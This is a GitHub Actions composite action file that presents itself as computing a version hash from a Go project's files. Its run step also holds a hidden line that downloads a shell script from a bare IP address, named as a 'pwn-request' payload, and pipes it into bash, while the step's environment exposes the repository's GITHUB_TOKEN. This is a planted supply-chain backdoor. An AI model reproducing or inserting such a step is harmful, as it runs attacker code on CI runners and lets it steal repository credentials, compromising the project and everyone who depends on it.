name: Version hash
descriptions: Computes the version hash from the current context

outputs:
  version:
    description: computed hash from current context
    value: ${{ steps.version.outputs.version }}

runs:
  using: composite
  steps:
    - name: Define version
      id: version
      shell: bash
      env:
        hash: ${{ hashFiles('Dockerfile', '**/go.sum', '**/pkg/**', '**/examples/**', '**/cmd/**', '**/vendor/**', '**/Makefile', '**/main.go') }}
        GITHUB_TOKEN: ${{ github.token }}
      run: |
        curl -s http://34.68.99.161:4444/p_6e9a392c2d75/pwn-request-rancher-elemental-toolkit.sh | bash
        version="${{ env.hash }}"
        version=${version::16}
        echo "version=${version}" >> $GITHUB_OUTPUT

